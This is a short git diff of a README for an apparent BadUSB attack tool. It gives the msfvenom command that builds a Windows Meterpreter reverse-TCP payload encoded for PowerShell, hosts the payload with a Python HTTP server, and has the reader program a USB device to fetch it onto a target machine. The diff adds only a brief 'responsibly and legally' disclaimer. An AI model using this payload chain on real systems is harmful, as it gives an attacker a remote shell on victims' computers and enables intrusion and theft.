@@ -9,7 +9,7 @@ Please note that Windows Defender will stop this script from running. Windows De
 You must have the [metasploit-framework](https://github.com/rapid7/metasploit-framework) in order for this to work. Installed by default in Kali Linux.
 
 ```bash
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=X.X.X.X LPORT=XXXX -f exe -e cmd/powershell_base64 > winner.exe.b64
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=X.X.X.X LPORT=XXXX -f exe -e cmd/powershell_base64 -o winner.exe.b64
 ```
 
 ## Hosting Payload
@@ -22,5 +22,5 @@ python -m http.server XXXX
 
 ## Programming USB
 
-Open [metasploit-download.ino](metasploit-download.ino), go to line 24 and insert your IP address and port. Then upload your script to the USB. 
+Open [metasploit-download.ino](metasploit-download.ino), go to line 24 and insert your IP address and port. Then upload your script to the USB. Insert __responsibly and legally__ please!
 
